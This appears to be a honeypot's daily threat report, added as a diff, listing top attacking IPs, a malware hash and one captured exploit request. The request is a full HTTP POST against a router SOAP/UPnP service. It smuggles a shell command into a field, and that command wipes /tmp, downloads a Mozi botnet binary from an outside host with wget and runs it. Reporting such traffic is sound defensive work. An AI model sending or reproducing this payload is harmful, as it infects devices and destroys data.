@@ -1,0 +1,29 @@
+Top 5 IPs for 09-08-2024 :
+
+64.227.146.61
+178.62.12.246
+46.148.227.154
+128.199.245.126
+170.233.144.110
+
+
+Malware Observed:
+
+File Name : xinetd
+b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+https://www.virustotal.com/gui/file/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+
+
+Commands/exploits observed:
+
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <Host IP>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://112.249.147.47:29148/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
